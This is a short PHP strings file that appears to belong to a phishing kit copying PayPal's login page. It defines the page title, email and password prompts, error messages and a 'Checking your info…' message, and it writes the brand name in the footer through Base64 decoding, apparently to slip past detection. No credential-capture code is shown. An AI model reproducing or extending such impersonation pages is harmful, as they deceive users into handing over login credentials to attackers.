<?php
$Z118_01 = "Log in to your PayPal Account";
$Z118_02 = "Email";
$Z118_03 = "Password";
$Z118_04 = "Email address is required.";
$Z118_05 = "Password is required.";
$Z118_06 = "Log In";
$Z118_07 = "Forgot your email or password?";
$Z118_08 = "Sign Up";
$Z118_09 = "Privacy";
$Z118_10 = "PayPal";
$Z118_11 = "Copyright © 1999-<script>document.write(new Date().getFullYear());</script> <script>document.write(Base64.decode('UGF5UGFs'));</script>. All rights reserved.";
$Z118_12 = "Checking your info…";
$Z118_13 = "Some of your info isn't correct. Please try again.";
?>
